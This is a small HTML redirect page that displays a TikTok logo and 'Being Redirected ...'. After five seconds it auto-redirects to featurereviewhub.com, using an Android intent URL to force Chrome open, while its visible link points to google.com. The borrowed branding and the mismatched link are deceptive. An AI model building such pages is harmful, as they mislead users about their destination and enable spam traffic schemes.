<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Example</title>
</head>
<body>
    <img id="tiktok-logo" src="https://i.ibb.co/5MMGFNf/1000-F-344600545-4j-FBe-Ak5l8-Kug2-Uyxq-OEoop8p1-I0v1dp-removebg-preview.png" alt="TikTok Logo" />
    <p id="redirect-text">Being Redirected ...</p>
    <a href="https://www.google.com" id="openLink">Click Me to Open in Chrome (Android) or Safari (iOS)</a>

    <script>
        function openLinkBasedOnDevice(url) {
            var userAgent = navigator.userAgent;

            if (/(android)/i.test(userAgent)) {
                // If the device is Android, open the link in Chrome
                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
                // If the device is iOS, open the link in Safari
                window.location.href = url;
            } else {
                // For other devices, open the link in the default browser
                window.open(url, '_blank');
            }
        }

        // Automatically execute the function after a 5-second delay
        setTimeout(function () {
            var url = 'https://featurereviewhub.com/';
            openLinkBasedOnDevice(url);
        }, 5000); // 5000 milliseconds = 5 seconds
    </script>
</body>
</html>
